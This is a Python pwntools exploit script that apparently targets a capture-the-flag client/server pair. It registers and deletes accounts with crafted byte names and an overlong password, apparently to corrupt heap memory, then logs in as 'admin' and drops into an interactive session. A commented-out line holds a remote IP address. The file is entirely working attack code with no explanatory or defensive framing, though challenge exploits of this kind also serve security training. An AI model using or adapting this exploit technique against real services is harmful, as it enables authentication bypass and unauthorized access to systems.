# -*- coding: utf-8 -*
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
elf = ELF('./client')
p = 0
def pwn(ip,port,debug):
	global p
	if(debug == 1):
		x = process("./server")
		#x = remote('82.156.58.12',9000)
		p = process(['./client',ip,port])

	else:
		p = remote(ip,port)
	def registe(name,passwd):
		p.sendlineafter("0 exit \n","1")
		p.sendlineafter("your name\n",name)
		p.sendlineafter("passwd\n",passwd)
	def login(name,passwd):
		p.sendlineafter("0 exit \n","2")
		p.sendlineafter("name\n",name)
		p.sendlineafter("passwd\n",passwd)

	def remove(name,passwd):
		p.sendlineafter("0 exit \n","4")
		p.sendlineafter("remove name\n",name)
		p.sendlineafter("passwd\n",passwd)
	registe("\x11",'1')
	registe("\x22",'2')
	registe("\x33",'3')
	remove("\x11",'1')
	remove("\x33",'3')
	remove("\x22",'2')
	registe("\x11",'2'*5*8+"\x40")
	registe("\x22",'2')
	registe("1"*0x10,"a")
	login("admin","1"*0x10)
	print x.recv()
	p.interactive()
if __name__ == '__main__':
	pwn('127.0.0.1','9999',1)

